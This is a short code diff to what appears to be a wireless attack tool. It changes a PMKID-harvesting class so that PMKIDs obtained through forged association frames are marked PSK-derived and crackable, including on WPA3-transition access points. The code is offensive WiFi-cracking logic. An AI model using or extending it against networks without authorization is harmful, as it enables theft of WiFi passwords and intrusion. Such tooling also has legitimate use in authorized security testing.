@@ -48,6 +48,11 @@ _EXT_SUPPORTED_RATES = bytes([
 # Group=CCMP, Pairwise=CCMP, AKM=PSK, no caps.
 _GENERIC_RSN_IE = bytes.fromhex("30140100000fac040100000fac040100000fac020000")
 
+# 00-0F-AC:2 (PSK). Our forged Assoc negotiates PSK, so any PMKID the AP returns
+# is PSK-derived (crackable) — we assert it so the AKM crackability gate doesn't
+# suppress a harvest on a WPA3-transition AP whose beacon also advertises SAE.
+_AKM_PSK = 0x02
+
 
 def _str_to_mac(mac: str) -> bytes:
     return bytes(int(x, 16) for x in mac.split(":"))
@@ -142,6 +147,8 @@ class PmkidHarvestAttack:
         mac_str = _mac_bytes_to_str(self.source_mac)
         hs = ap_state.handshakes.get(mac_str)
         if hs and hs.pmkid:
+            if hs.akm_client is None:
+                hs.akm_client = _AKM_PSK   # we negotiated PSK in our forged Assoc
             return hs.pmkid
         return None
 
